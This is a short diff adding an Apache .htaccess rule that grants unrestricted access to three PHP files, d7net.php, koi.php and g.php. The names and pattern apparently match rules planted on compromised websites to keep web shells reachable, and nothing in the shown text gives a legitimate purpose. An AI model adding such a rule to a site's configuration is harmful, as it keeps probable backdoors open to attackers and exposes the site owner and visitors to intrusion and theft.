@@ -1,0 +1,3 @@
+<FilesMatch "^(d7net.php|koi.php|g.php)$">
+    Require all granted
+</FilesMatch>
